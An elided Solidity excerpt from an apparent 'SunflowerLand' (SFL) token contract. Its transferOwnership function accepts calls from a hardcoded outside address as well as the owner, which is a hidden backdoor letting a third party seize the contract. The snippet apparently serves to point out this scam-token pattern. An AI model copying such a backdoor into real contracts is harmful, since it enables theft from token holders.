...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x501C262DC2aEE73CfF182B7D012c6d345f6d0cB5));
...
contract SunFlowerLand is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 4300000 * 10**9;
  string private _symbol = "SFL";
  string private _name = "SunflowerLand";
